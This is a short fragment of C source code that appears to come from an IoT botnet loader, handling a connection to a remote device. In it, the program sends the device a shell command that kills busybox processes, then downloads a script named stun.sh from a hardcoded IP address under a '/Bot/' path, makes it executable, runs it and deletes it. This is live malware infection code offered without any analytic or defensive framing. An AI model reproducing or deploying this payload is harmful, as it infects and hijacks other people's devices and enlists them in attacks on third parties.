...
{
if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
if(send(fds[i].fd, "cd /tmp || cd /var/run; kill -9 $(pidof ./busybox); wget http://89.34.99.168/Bot/stun.sh; chmod +x stun.sh; sh stun.sh; rm -f stun.sh\r\n", 135, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
